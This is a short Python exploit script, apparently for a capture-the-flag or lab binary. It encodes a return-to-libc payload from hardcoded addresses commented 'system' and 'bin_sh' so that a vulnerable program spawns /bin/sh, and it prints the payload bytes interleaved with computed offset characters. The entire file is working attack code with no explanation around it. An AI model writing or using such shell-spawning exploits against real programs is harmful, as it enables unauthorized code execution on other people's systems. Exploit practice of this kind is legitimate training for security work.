import sys

start = int(sys.argv[1]) - 12 + 3

 # 15ccc8 /bin/sh


payload = b""
payload += b"\x50\xc8\xe4\xf7" # system
payload += b"\x00\x02\xe1\xf7" # bin_sh

for i in range(len(payload)):
    x = (start + i) ^ (i * 3)
    print(repr(f'{chr(x)}{chr(payload[i])}')[1:-1], end="")
